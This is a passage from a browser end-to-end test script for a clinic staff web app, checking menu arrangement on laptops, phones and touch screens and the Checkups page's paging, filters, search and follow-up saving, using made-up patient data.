await step('Arrange my menu: Save leaves the page alone (a half-typed expense keeps what was typed and where it was scrolled to)', async () => {
  await loginAs(pnForm, 'Dr. Ali Rashid');
  await pnForm.goto(BASE + '#/staff/accounts?tab=expenses');
  const typed = [['Amount', '4500'], ['Paid to', 'Sample supplier'], ['Notes', 'half-typed expense']];
  await pnForm.getByLabel('Paid to').waitFor();
  for (const [label, value] of typed) await pnForm.getByLabel(label).fill(value);
  await pnForm.evaluate(() => { document.querySelector('main').dataset.kept = 'yes'; window.scrollTo(0, 140); });
  const scrolled = await pnForm.evaluate(() => window.scrollY);
  await openArrange(pnForm);
  await arrangeDialog(pnForm).getByRole('button', { name: 'Put on the top bar: Stock', exact: true }).click();
  await saveArrange(pnForm, [...ADMIN_BAR.slice(0, -1), 'Stock', 'More']);
  for (const [label, value] of typed) assert.equal(await pnForm.getByLabel(label).inputValue(), value, label);
  assert.equal(await pnForm.locator('main').getAttribute('data-kept'), 'yes', 'the page was not drawn again');
  assert.equal(await pnForm.evaluate(() => window.scrollY), scrolled, 'nor moved back to the top');
  assert.match(await pnForm.locator('.topnav .menu > button:has-text("Reports")').getAttribute('class'), /current/, 'the new top bar still marks the section on screen');
  await shot(pnForm, '24-expense-kept-after-save');
});
// A drop-down taller than the window (a whole menu put under More) scrolls inside the window: a 1366 x 768 laptop screen, after
// the taskbar and the browser's own bars.
const pnShort = await newPage({ width: 1366, height: 625 });
await step('Arrange my menu: with the Reports drop-down under More, the long More list scrolls inside the window and its last link can be used', async () => {
  await pnShort.goto(BASE + '#/login/staff');
  await pnShort.evaluate(() => localStorage.setItem('staff-menu:s-admin', JSON.stringify(['-menu:reports'])));
  await loginAs(pnShort, 'Dr. Ali Rashid');
  assert.deepEqual(await barLabels(pnShort), ADMIN_BAR.filter((l) => l !== 'Reports'));
  await pnShort.locator('.topnav .menu:has(> button:has-text("More")) > button').click();
  const list = pnShort.locator('.topnav .menu.open .menu-list');
  const size = await list.evaluate((el) => ({ bottom: el.getBoundingClientRect().bottom, scrolls: el.scrollHeight > el.clientHeight }));
  assert.ok(size.scrolls && size.bottom <= 625, `the list ends inside the window (at ${Math.round(size.bottom)} of 625) and scrolls`);
  // All the Reports pages are one group under its name, the Accounts tabs after the line inside it too; Stock is More's own.
  const reports = list.getByRole('group', { name: 'Reports', exact: true });
  assert.deepEqual((await reports.locator('a').allTextContents()).map((t) => t.trim()),
    ['Financial', 'Patients', 'OPD', 'Inventory', 'Accounts', 'HR', 'Branch income vs expenses', 'Expenses', 'Cash closing']);
  assert.equal(await reports.locator('hr').count(), 1, 'the line between the reports and the Accounts tabs is inside the group');
  assert.equal(await list.locator(':scope > a:text-is("Stock")').count(), 1, "Stock is one of More's own pages");
  // To the eye: the Accounts tabs are indented like the reports, under the name; the line inside the group starts at that indent,
  // the line that ends the group runs the full width.
  const look = await list.evaluate((el) => {
    const left = (x) => x.getBoundingClientRect().left - el.getBoundingClientRect().left;
    const text = (a) => left(a) + parseFloat(getComputedStyle(a).paddingLeft);
    const link = (name) => [...el.querySelectorAll('a')].find((a) => a.textContent.trim() === name);
    const section = el.querySelector('[role="group"]');
    return { financial: text(link('Financial')), cash: text(link('Cash closing')), stock: text(link('Stock')), heading: text(section.querySelector('.menu-heading')),
      inner: left(section.querySelector('hr')), outer: left(section.nextElementSibling) };
  });
  assert.equal(look.cash, look.financial, `the Accounts tabs line up with the reports (${JSON.stringify(look)})`);
  assert.ok(look.financial > look.heading + 8 && look.financial > look.stock + 8, `the Reports pages are indented under its name, further in than Stock (${JSON.stringify(look)})`);
  assert.ok(look.inner > look.outer + 8, `the line inside the group is indented, the one after it is not (${JSON.stringify(look)})`);
  await shot(pnShort, '25-long-more-scrolls');
  // The mouse wheel scrolls the list, and the page behind it stays where it is.
  const box = await list.boundingBox();
  await pnShort.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
  await pnShort.mouse.wheel(0, 3000);
  await pnShort.waitForFunction(() => document.querySelector('.topnav .menu.open .menu-list').scrollTop > 0);
  assert.equal(await pnShort.evaluate(() => window.scrollY), 0, 'the page did not scroll');
  // With the keyboard, the last link is on screen when it has focus.
  await list.evaluate((el) => { el.scrollTop = 0; });
  const last = list.locator('a:text-is("Audit log")');
  await last.focus();
  const at = await last.boundingBox();
  assert.ok(at.y >= 0 && at.y + at.height <= 625, `"Audit log" is on screen with focus (at ${Math.round(at.y)})`);
  await last.click();
  await pnShort.waitForFunction(() => location.hash === '#/staff/admin?tab=audit');
});
await step('Arrange my menu on a phone: with the Reports drop-down under More, the drawer keeps all its pages in its group, the Accounts tabs too', async () => {
  await pnShort.setViewportSize({ width: 390, height: 844 });
  await pnShort.locator('.menu-toggle').click();
  await pnShort.waitForSelector('#staff-drawer.open');
  const more = pnShort.getByRole('group', { name: 'More', exact: true });
  const reports = more.getByRole('group', { name: 'Reports', exact: true });
  assert.deepEqual((await reports.locator('a').allTextContents()).map((t) => t.trim()),
    ['Financial', 'Patients', 'OPD', 'Inventory', 'Accounts', 'HR', 'Branch income vs expenses', 'Expenses', 'Cash closing']);
  assert.equal(await more.locator(':scope > a:text-is("Stock")').count(), 1, "Stock is one of More's own pages");
  assert.equal(await more.locator(':scope > a:text-is("Expenses"), :scope > a:text-is("Cash closing")').count(), 0, 'no Accounts tab is left among them');
  const indents = await reports.evaluate((g) => [...g.querySelectorAll('a')].map((a) => a.getBoundingClientRect().left + parseFloat(getComputedStyle(a).paddingLeft)));
  assert.equal(new Set(indents).size, 1, `every Reports page at the same indent (${indents.join(', ')})`);
  await shot(pnShort, '25b-drawer-reports-under-more');
  await pnShort.keyboard.press('Escape');
});
// Before 20261015000100 is run (the owner runs it by hand in the SQL Editor), Save keeps the menu on this computer only and says
// it will follow the person once the update is run. The stand-in below answers like supabase.js does then: no row, and Save
// fails with MENU_PREFS_MISSING.
const pnEarly = await newPage();
const savedInDatabase = (pg) => pg.evaluate(async () => (await import('/js/state.js')).state.data.myMenuArrangement());
await step('Arrange my menu before its database update is run: kept on this computer, then in the database once the update is run (at Save, or by itself at the next login)', async () => {
  await pnEarly.goto(BASE + '#/login/staff');
  await pnEarly.evaluate(async () => {
    const { state } = await import('/js/state.js');
    await state.ready;
    window.realMenuCalls = { myMenuArrangement: state.data.myMenuArrangement, saveMyMenuArrangement: state.data.saveMyMenuArrangement };
    state.data.myMenuArrangement = async () => null;
    state.data.saveMyMenuArrangement = async () => { throw Object.assign(new Error('MENU_PREFS_MISSING: the menu cannot be saved in the database until its update is run.'), { code: 'MENU_PREFS_MISSING' }); };
  });
  await pnEarly.getByRole('button', { name: /Dr\. Ali Rashid/ }).click();
  await pnEarly.waitForSelector('.topbar');
  await openArrange(pnEarly);
  await arrangeDialog(pnEarly).getByRole('button', { name: 'Put on the top bar: Stock', exact: true }).click();
  await arrangeDialog(pnEarly).getByRole('button', { name: 'Save', exact: true }).click();
  await arrangeDialog(pnEarly).waitFor({ state: 'detached' });
  await pnEarly.waitForSelector('.toast:has-text("Menu saved on this computer. It will follow you to other computers once the database update for it is run.")');
  assert.deepEqual(await barLabels(pnEarly), [...ADMIN_BAR.slice(0, -1), 'Stock', 'More']);
  // The update is run. Save with nothing changed now puts the menu in the database (not "Nothing changed.").
  await pnEarly.evaluate(async () => { Object.assign((await import('/js/state.js')).state.data, window.realMenuCalls); });
  assert.equal(await savedInDatabase(pnEarly), null);
  await openArrange(pnEarly);
  await arrangeDialog(pnEarly).getByRole('button', { name: 'Save', exact: true }).click();
  await arrangeDialog(pnEarly).waitFor({ state: 'detached' });
  await pnEarly.waitForSelector('.toast:has-text("Menu saved. It follows you to any computer you log in on.")');
  assert.ok((await savedInDatabase(pnEarly)).includes('stock'), 'in the database');
  // Without a Save: a reload starts the demo afresh (logged out, no row in its data, the update "run") with the copy still on this
  // computer. The login sends it up by itself, in the background.
  await pnEarly.reload();
  await loginAs(pnEarly, 'Dr. Ali Rashid');
  assert.deepEqual(await barLabels(pnEarly), [...ADMIN_BAR.slice(0, -1), 'Stock', 'More']);
  let row = null;
  for (let n = 0; n < 50 && !row; n++) { row = await savedInDatabase(pnEarly); if (!row) await pnEarly.waitForTimeout(100); }
  assert.ok(row?.includes('stock'), `sent up at the login (the database has ${JSON.stringify(row)})`);
  await shot(pnEarly, '26-menu-sent-up-after-update');
});
// Real scrollbars, as on the clinic's Windows laptops (this test's Chrome hides them otherwise). A dialog hides the page's scrollbar
// while it is open, and Save fits the top bar before the dialog closes: once the scrollbar is back the bar has about 15px less.
const browserBars = await chromium.launch({ executablePath: process.env.CHROME_PATH || undefined, ignoreDefaultArgs: ['--hide-scrollbars'] });
const pnBars = await newPage({ width: 1366, height: 768 }, {}, browserBars);
await step('Arrange my menu with real scrollbars: after Save the top bar fits the page as it is once the dialog has closed (no sideways scrolling)', async () => {
  await loginAs(pnBars, 'Dr. Ali Rashid');
  await pnBars.goto(BASE + '#/staff/patients');
  await pnBars.waitForFunction(() => window.innerWidth - document.documentElement.clientWidth > 0, null, { timeout: 5000 }); // the long list brings the scrollbar
  await openArrange(pnBars);
  for (const name of ['Reminders (Coordinator)', 'Lab work (Coordinator)', 'Cash closing (Reports)']) {
    await arrangeDialog(pnBars).getByRole('button', { name: `Put on the top bar: ${name}`, exact: true }).click();
  }
  await saveArrange(pnBars);
  const fits = () => { const bar = document.querySelector('.topbar'); const page = document.documentElement; return bar.scrollWidth <= bar.clientWidth && page.scrollWidth <= page.clientWidth; };
  await pnBars.waitForFunction(fits, null, { timeout: 3000 }).catch(async () => {
    const m = await pnBars.evaluate(() => ({ bar: document.querySelector('.topbar').scrollWidth - document.querySelector('.topbar').clientWidth, page: document.documentElement.scrollWidth - document.documentElement.clientWidth }));
    assert.fail(`the top bar is ${m.bar}px too wide and the page scrolls sideways by ${m.page}px`);
  });
  const shown = await barLabels(pnBars);
  assert.equal(shown.at(-1), 'More');
  const inMenus = await pnBars.locator('.topnav .menu-list a').allTextContents();
  for (const label of ['Reminders', 'Lab work', 'Cash closing']) assert.ok(shown.includes(label) || inMenus.includes(label), `${label} can be reached`);
  await shot(pnBars, '26b-top-bar-with-scrollbar');
});
await browserBars.close();
// The pages change tabs without a new address (history.replaceState): a tab page on the top bar is marked from the address as it is
// now, on the bar and in the phone drawer, the way a drop-down marks its links each time it opens.
const pnTabs = await newPage();
await step('Arrange my menu: with Reminders, Low ratings and Lab work on the top bar, changing tab inside the page moves the "current page" mark with it, and Lab work (its own page now) is marked on its own address (bar and drawer)', async () => {
  await pnTabs.goto(BASE + '#/login/staff');
  await pnTabs.evaluate(() => localStorage.setItem('staff-menu:s-admin', JSON.stringify(['coordinator?tab=reminders', 'coordinator?tab=ratings', 'lab', 'today', 'menu:sheet', 'patients', 'billing', 'menu:reports', 'menu:coordinator'])));
  await loginAs(pnTabs, 'Dr. Ali Rashid');
  const markedOn = (where) => pnTabs.waitForFunction(([sel, want]) => [...document.querySelectorAll(sel)].filter((a) => a.getAttribute('aria-current') === 'page' && a.classList.contains('current')).map((a) => a.textContent.trim()).join('|') === want
    && [...document.querySelectorAll(sel)].filter((a) => a.getAttribute('aria-current') === 'page' || a.classList.contains('current')).length === (want ? 1 : 0), where, { timeout: 3000 });
  await pnTabs.locator('.topnav > a:text-is("Reminders")').click();
  await pnTabs.waitForSelector('[role="tab"][aria-selected="true"]:has-text("Reminders")');
  await markedOn(['.topnav > a', 'Reminders']);
  // A click on the Low ratings tab inside the page.
  await pnTabs.getByRole('tab', { name: /Low ratings/ }).click();
  await pnTabs.waitForFunction(() => location.hash === '#/staff/coordinator?tab=ratings');
  await markedOn(['.topnav > a', 'Low ratings']);
  await markedOn(['#staff-drawer .drawer-links > a', 'Low ratings']);
  // The keyboard: the arrow keys move along the tabs, Enter chooses one. A tab that is not on the bar marks nothing there.
  await pnTabs.keyboard.press('ArrowLeft');
  await pnTabs.keyboard.press('Enter');
  await pnTabs.waitForFunction(() => location.hash === '#/staff/coordinator?tab=dropoffs');
  await markedOn(['.topnav > a', '']);
  await pnTabs.keyboard.press('ArrowLeft');
  await pnTabs.keyboard.press('Enter');
  await markedOn(['.topnav > a', 'Reminders']);
  await pnTabs.keyboard.press('End'); // back to Low ratings
  await pnTabs.keyboard.press('Enter');
  await pnTabs.waitForFunction(() => location.hash === '#/staff/coordinator?tab=ratings');
  await markedOn(['.topnav > a', 'Low ratings']);
  // Lab work is a page of its own (#/staff/lab): on the bar it is the page on screen there, and nothing else is.
  await pnTabs.locator('.topnav > a:text-is("Lab work")').click();
  await pnTabs.waitForFunction(() => location.hash === '#/staff/lab');
  await markedOn(['.topnav > a', 'Lab work']);
  await markedOn(['#staff-drawer .drawer-links > a', 'Lab work']);
  // On a phone the drawer opens on Lab work, the page on screen, and a screen reader hears it as the current page.
  await pnTabs.setViewportSize({ width: 390, height: 844 });
  await pnTabs.locator('.menu-toggle').click();
  await pnTabs.waitForSelector('#staff-drawer.open');
  assert.deepEqual(await pnTabs.locator('#staff-drawer a[aria-current="page"]').allTextContents(), ['Lab work']);
  assert.equal(await pnTabs.evaluate(() => document.activeElement.textContent.trim()), 'Lab work', 'focus starts on the page on screen');
  await pnTabs.keyboard.press('Escape');
});
await pnTabs.close();
// Checkups and History of Aaj ki List light up the Aaj ki List drop-down (they are its section): a page put on the top bar from that
// drop-down is still the page on screen only at its own address, so two links never both say they are the page on screen.
const pnSection = await newPage({ width: 1600, height: 900 });
await step('Arrange my menu: with Aaj ki List, Checkups and History of Aaj ki List on the top bar, only the page on screen is marked (bar and drawer)', async () => {
  await pnSection.goto(BASE + '#/login/staff');
  await pnSection.evaluate(() => localStorage.setItem('staff-menu:s-admin', JSON.stringify(['today', 'sheet', 'checkups', 'day-history', 'menu:sheet', 'patients', 'billing', 'menu:reports', 'menu:coordinator'])));
  await loginAs(pnSection, 'Dr. Ali Rashid');
  const marked = (sel) => pnSection.locator(sel).evaluateAll((els) => els.filter((a) => a.getAttribute('aria-current') === 'page' || a.classList.contains('current')).map((a) => a.textContent.trim()));
  for (const [hash, heading, label] of [['#/staff/checkups', 'Checkups', 'Checkups'], ['#/staff/day-history', 'History of Aaj ki List', 'History of Aaj ki List'], ['#/staff/sheet', 'Aaj ki List', 'Aaj ki List (today)']]) {
    await pnSection.goto(BASE + hash);
    await pnSection.waitForSelector(`h1:text-is("${heading}")`);
    assert.deepEqual(await marked('.topnav > a'), [label], `on ${hash} one link on the bar is the page on screen`);
    assert.deepEqual(await marked('#staff-drawer .drawer-links > a'), [label], `on ${hash} one link in the drawer is too`);
  }
  // On a phone the drawer opens on Checkups, the page on screen.
  await pnSection.goto(BASE + '#/staff/checkups');
  await pnSection.waitForSelector('h1:text-is("Checkups")');
  await pnSection.setViewportSize({ width: 390, height: 844 });
  await pnSection.locator('.menu-toggle').click();
  await pnSection.waitForSelector('#staff-drawer.open');
  assert.deepEqual((await pnSection.locator('#staff-drawer a[aria-current="page"]').allTextContents()).map((t) => t.trim()), ['Checkups']);
  assert.equal(await pnSection.evaluate(() => document.activeElement.textContent.trim()), 'Checkups', 'focus starts on the page on screen');
  await pnSection.keyboard.press('Escape');
});
await pnSection.close();
// A touch screen: the dialog's buttons act on every tap. Chrome counts quick taps at one spot like the clicks of a double-click
// (1, 2, 3, then 1 again); only a mouse double-click is left alone at its second click.
const pnTouch = await newPage({ width: 390, height: 844 }, { isMobile: true, hasTouch: true });
await step('Arrange my menu on a touch screen: a double tap on "Arrange my menu" in the drawer opens the dialog and presses none of its buttons', async () => {
  await loginAs(pnTouch, 'Dr. Ali Rashid');
  await pnTouch.locator('.menu-toggle').click();
  await pnTouch.waitForSelector('#staff-drawer.open');
  const arrange = pnTouch.locator('#staff-drawer > button:text-is("Arrange my menu")');
  await arrange.scrollIntoViewIfNeeded();
  await pnTouch.waitForFunction(() => document.querySelector('#staff-drawer').getBoundingClientRect().left === 0); // slid in
  const box = await arrange.boundingBox();
  const spot = [box.x + box.width / 2, box.y + box.height / 2];
  await pnTouch.touchscreen.tap(...spot);
  await pnTouch.touchscreen.tap(...spot);
  await arrangeDialog(pnTouch).waitFor();
  // The second tap lands on a row of the dialog: it used to press the button there and move that row's page.
  assert.ok(await pnTouch.evaluate(([x, y]) => !!document.elementFromPoint(x, y)?.closest('.modal .arrange-row'), spot), 'the second tap landed on a row of the dialog');
  await pnTouch.waitForTimeout(500);
  assert.deepEqual(await topRows(pnTouch), ADMIN_TOP_ROWS, 'no page moved');
  assert.equal(await arrangeDialog(pnTouch).locator('.arrange-moved').count(), 0);
  assert.equal(await focusedName(pnTouch), 'On the top bar', 'focus is where the dialog put it');
  // The moment over, a tap acts at once.
  const down = arrangeDialog(pnTouch).getByRole('button', { name: 'Move down: Today', exact: true });
  await down.scrollIntoViewIfNeeded();
  const at = await down.boundingBox();
  await pnTouch.touchscreen.tap(at.x + at.width / 2, at.y + at.height / 2);
  assert.deepEqual((await topRows(pnTouch)).slice(0, 2), ['Aaj ki List drop-down', 'Today']);
  await pnTouch.keyboard.press('Escape');
  await arrangeDialog(pnTouch).waitFor({ state: 'detached' });
});
await step('Arrange my menu on a touch screen: quick taps at one spot all count; a mouse double-click still moves a page once', async () => {
  await pnTouch.locator('.menu-toggle').click();
  await pnTouch.locator('#staff-drawer > button:text-is("Arrange my menu")').click();
  await arrangeOpened(pnTouch);
  const where = async () => (await topRows(pnTouch)).indexOf('Coordinator drop-down');
  assert.equal(await where(), 5);
  // Real taps, quick and at one spot: the moved page's button stays under the finger, and each tap moves it one more place.
  const up = arrangeDialog(pnTouch).getByRole('button', { name: 'Move up: Coordinator drop-down', exact: true });
  await up.scrollIntoViewIfNeeded();
  const box = await up.boundingBox();
  for (let n = 0; n < 4; n++) await pnTouch.touchscreen.tap(box.x + box.width / 2, box.y + box.height / 2);
  await pnTouch.waitForFunction(() => document.querySelectorAll('.modal ol.arrange-list > li')[1]?.textContent.includes('Coordinator drop-down'), null, { timeout: 3000 })
    .catch(async () => assert.fail(`four taps: Coordinator is at row ${(await where()) + 1}, not 2`));
  // Taps carrying the counts 1, 2, 3, 1, 2 and 3 (as the browser sends a tap: pointerdown, mousedown and a click with the count),
  // each on the button under the finger by then: every tap moves the page one place.
  const tap = (label, count) => pnTouch.evaluate(([name, n]) => {
    const b = document.querySelector(`.modal button[aria-label="${name}"]`);
    b.dispatchEvent(new PointerEvent('pointerdown', { bubbles: true, cancelable: true, pointerType: 'touch', isPrimary: true }));
    b.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true, detail: n }));
    b.dispatchEvent(new PointerEvent('click', { bubbles: true, cancelable: true, detail: n, pointerType: 'touch' }));
  }, [label, count]);
  for (const n of [1, 2, 3, 1]) await tap('Move down: Coordinator drop-down', n);
  assert.equal(await where(), 5, 'taps counted 1, 2, 3, 1: four places down');
  for (const n of [2, 3]) await tap('Move up: Coordinator drop-down', n);
  assert.equal(await where(), 3, 'and 2, 3: two places up');
  // A mouse double-click (the clicks counted 1 and 2) moves it once.
  await arrangeDialog(pnTouch).getByRole('button', { name: 'Move up: Coordinator drop-down', exact: true }).dblclick();
  assert.equal(await where(), 2, 'a mouse double-click: one place');
  await pnTouch.keyboard.press('Escape');
  await arrangeDialog(pnTouch).waitFor({ state: 'detached' });
});
// A drop-down put under More is a group of its own in the phone drawer, so More's own pages do not look (or sound) like its pages.
await step('Arrange my menu on a phone: with the Coordinator drop-down under More, the drawer keeps its pages in a group of their own; Stock is not one of them', async () => {
  await pnTouch.locator('.menu-toggle').click();
  await pnTouch.locator('#staff-drawer > button:text-is("Arrange my menu")').click();
  await arrangeOpened(pnTouch);
  await arrangeDialog(pnTouch).getByRole('button', { name: 'Put in More: Coordinator drop-down', exact: true }).click();
  await saveArrange(pnTouch);
  await pnTouch.locator('.menu-toggle').click();
  await pnTouch.waitForSelector('#staff-drawer.open');
  const more = pnTouch.getByRole('group', { name: 'More', exact: true });
  const coordinator = more.getByRole('group', { name: 'Coordinator', exact: true });
  assert.deepEqual((await coordinator.locator('a').allTextContents()).map((t) => t.trim()), ['Reminders', 'Drop-offs', 'Lab work', 'Retainer Record', 'Low ratings']);
  const stock = more.locator(':scope > a:text-is("Stock")');
  assert.equal(await stock.count(), 1, 'Stock is one of More\'s own pages');
  assert.equal(await coordinator.locator('a:text-is("Stock")').count(), 0, 'not a Coordinator page');
  // To the eye: the Coordinator pages are indented under their name, More's own pages are back at the usual indent. (Both are
  // measured at once, from the group's edge: the drawer may still be sliding in.)
  const indents = await more.evaluate((g) => {
    const at = (a) => a.getBoundingClientRect().left - g.getBoundingClientRect().left + parseFloat(getComputedStyle(a).paddingLeft);
    return { coordinator: at(g.querySelector('.drawer-subgroup a')), stock: at([...g.querySelectorAll(':scope > a')].find((a) => a.textContent.trim() === 'Stock')) };
  });
  assert.ok(indents.coordinator > indents.stock + 8, `the Coordinator pages are further in than Stock (${indents.coordinator} and ${indents.stock} px)`);
  await shot(pnTouch, '27-drawer-more-groups');
  await pnTouch.keyboard.press('Escape');
});
await pnTouch.close();

// ------------------------------------------------------------- the Checkups page (admin), Download Excel, the checkup list import
// (Made-up names and phones only. Each page has its own in-memory demo data: the same page is used from the import to the
// front desk check at the end, and is never reloaded.)
const pk = await newPage();
const rowsOf = (pg) => pg.locator('table.checkup-table tbody tr[data-id]');
const pagerTotal = async (pg) => Number((await pg.locator('.pager-info').innerText()).match(/of ([\d,]+)/)[1].replace(/,/g, ''));
// Branch, the months, Source and Patient file sit behind "More filters" (a closed <details> hides them from the person and from the test).
const moreFilters = async (pg) => {
  const d = pg.locator('details.checkup-more');
  if (!(await d.evaluate((el) => el.open))) await d.locator('summary').click();
};
const openCheckups = async (pg) => {
  await pg.locator('.topnav .menu:has(> button:has-text("Aaj ki List")) > button').click();
  await pg.locator('.topnav .menu-list a:text-is("Checkups")').click();
  await pg.waitForSelector('h1:has-text("Checkups")');
  await pg.waitForSelector('table.checkup-table tbody tr[data-id]');
};
await step('Checkups page: menu entry, 50 rows a page, Next and Previous keep focus, the paging line says "of N"', async () => {
  await loginAs(pk, 'Dr. Ali Rashid');
  await openCheckups(pk);
  assert.match(await pk.locator('.topnav .menu:has(> button:has-text("Aaj ki List")) > button').getAttribute('class'), /current/, 'the Aaj ki List menu stays highlighted');
  const total = await pagerTotal(pk);
  assert.ok(total > 50, `more than one page of checkups (${total})`);
  assert.equal(await rowsOf(pk).count(), 50);
  assert.equal((await pk.locator('.page-head p').innerText()).trim(), `${total.toLocaleString('en-PK')} checkup patients`, 'no leftover "(no patient file, no Mr#)"');
  assert.equal(await pk.getByRole('button', { name: 'Previous' }).getAttribute('aria-disabled'), 'true');
  await pk.getByRole('button', { name: 'Next' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes('Showing 51-'), total);
  assert.equal(await rowsOf(pk).count(), Math.min(50, total - 50));
  assert.equal(await pk.evaluate(() => document.activeElement?.textContent), 'Next', 'focus stays on the pressed button');
  assert.deepEqual((await pk.locator('table.checkup-table thead th').allInnerTexts()).slice(0, 9).map((t) => t.trim()), ['Date', 'Patient', 'Branch', 'Treatment', 'Wants to start', 'When / why not', 'Follow-up', 'Notes', 'Source'], 'one word, Treatment, as on the Aaj ki List; then the answers of the checkup form');
  assert.ok(await pk.evaluate(() => { const w = document.querySelector('.checkup-table-wrap'); return w.scrollWidth <= w.clientWidth + 1; }), 'at 1366 px the whole list fits, answers included');
  assert.match(await pk.evaluate(() => location.hash), /page=2/);
  await pk.getByRole('button', { name: 'Previous' }).click();
  await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing 1-50'));
  assert.equal(await rowsOf(pk).count(), 50);
  await shot(pk, '15-checkups-page');
});
await step('Checkups page: Tab down the table never leaves the focused control under the paging bar', async () => {
  await pk.getByLabel('Name or phone').focus();
  let covered = 0;
  let farthest = 0;
  for (let i = 0; i < 90; i += 1) {
    await pk.keyboard.press('Tab');
    const seen = await pk.evaluate(() => {
      const a = document.activeElement;
      const p = document.querySelector('.pager');
      if (!a || !p || a === document.body || p.contains(a)) return null;
      const ar = a.getBoundingClientRect();
      const pr = p.getBoundingClientRect();
      return { hidden: ar.height > 0 && ar.bottom > pr.top + 1 && ar.top < pr.bottom - 1, y: window.scrollY };
    });
    if (seen?.hidden) covered += 1;
    farthest = Math.max(farthest, seen?.y || 0);
  }
  assert.ok(farthest > 100, 'tabbing went down the page (' + farthest + 'px)');
  assert.equal(covered, 0, covered + ' Tab stops landed under the paging bar');
  await pk.evaluate(() => window.scrollTo(0, 0));
});
await step('Checkups page: the less-used filters sit behind "More filters", which opens by itself when one of them is in use', async () => {
  const more = pk.locator('details.checkup-more');
  assert.equal(await more.evaluate((el) => el.open), false, 'closed by default');
  assert.equal(await pk.locator('.checkup-filters').getByLabel('Branch').isVisible(), false);
  assert.ok(await pk.locator('.checkup-filters').getByLabel('Follow-up').isVisible(), 'Follow-up stays in sight');
  assert.ok(await pk.getByLabel('Name or phone').isVisible());
  assert.equal(await more.locator('summary').innerText(), 'More filters');
  await moreFilters(pk);
  assert.ok(await pk.locator('.checkup-filters').getByLabel('Branch').isVisible());
  await pk.goto(BASE + '#/staff/checkups?source=archive');
  await pk.waitForFunction(() => document.querySelector('details.checkup-more')?.open === true && document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false');
  assert.equal(await pk.locator('details.checkup-more summary').innerText(), 'More filters (1 in use)');
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction(() => document.querySelector('details.checkup-more summary')?.textContent === 'More filters');
});
await step('Checkups page: a piece of a phone number with fewer than 4 digits says why nothing is found', async () => {
  await pk.getByLabel('Name or phone').fill('555');
  await pk.locator('.empty:has-text("No checkups match these filters.")').waitFor();
  assert.match(await pk.locator('.empty').innerText(), /To search by phone, type at least 4 digits\./);
  assert.match(await pk.locator('main').innerText(), /Part of the name, or at least 4 digits of the phone\./, 'the hint is under the box all the time');
  assert.equal(await pk.getByLabel('Name or phone').getAttribute('aria-describedby'), 'checkup-search-hint');
  await pk.getByLabel('Name or phone').fill('5550');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length > 0);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing 1-50'));
});
await step('Checkups page: search by name or phone, filters, and "Clear filters"', async () => {
  const total = await pagerTotal(pk);
  const first = await rowsOf(pk).first().locator('.checkup-name-text').innerText();
  await pk.getByLabel('Name or phone').fill(first);
  await pk.waitForFunction((name) => [...document.querySelectorAll('table.checkup-table tbody tr[data-id]')].every((t) => t.textContent.includes(name)) && document.querySelectorAll('table.checkup-table tbody tr[data-id]').length > 0, first);
  assert.ok((await pagerTotal(pk)) < total, 'the search narrows the list');
  assert.match(await pk.evaluate(() => location.hash), /q=/);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
  // a phone number written another way finds the same row (0300-555 and 0300555 are the same digits)
  const phoneText = await rowsOf(pk).first().locator('.phone-link').innerText();
  const digits = phoneText.replace(/\D/g, '');
  await pk.getByLabel('Name or phone').fill(`+92 ${digits.slice(1, 4)}-${digits.slice(4)}`);
  await pk.waitForFunction((d) => [...document.querySelectorAll('table.checkup-table tbody tr[data-id] .phone-link')].some((e) => e.textContent.replace(/\D/g, '') === d), digits);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
  // Follow-up filter
  await pk.locator('.checkup-filters').getByLabel('Follow-up').selectOption('Interested');
  await pk.waitForFunction((n) => !document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
  const values = await pk.locator('table.checkup-table tbody select[aria-label^="Follow-up status for"]').evaluateAll((els) => els.map((e) => e.value));
  assert.ok(values.length > 0 && values.every((v) => v === 'Interested'), 'only Interested rows');
  // Month range and Source filter
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Source').selectOption('archive');
  await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing'));
  const sources = await pk.locator('table.checkup-table tbody tr[data-id] td:nth-child(9)').allInnerTexts();
  assert.ok(sources.length > 0 && sources.every((t) => /^Old list/.test(t.trim())), 'only old-list rows');
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Patient file').selectOption('yes');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id] a.mr').length > 0);
  assert.ok((await rowsOf(pk).count()) >= 1);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
});
await step('Checkups page: a follow-up status and a note save, and are still there after leaving the page and coming back', async () => {
  const row = rowsOf(pk).first();
  const name = await row.locator('.checkup-name-text').innerText();
  const id = await row.getAttribute('data-id');
  const current = await row.locator('select[aria-label^="Follow-up status for"]').inputValue();
  const target = current === 'Scheduled' ? 'No Response' : 'Scheduled';
  await row.locator('select[aria-label^="Follow-up status for"]').selectOption(target);
  await row.locator('.saved-mark').waitFor({ state: 'visible' });
  assert.match(await row.locator('.saved-mark').innerText(), /Saved/, 'the person sees that the status is saved');
  await row.locator('input[aria-label^="Notes for"]').fill('Call back on Monday (test)');
  await pk.waitForTimeout(1200);
  assert.equal((await pk.locator('.save-state').innerText()).trim(), 'All changes saved');
  await pk.locator('.topnav a:has-text("Today")').click();
  await pk.waitForSelector('.stat');
  await openCheckups(pk);
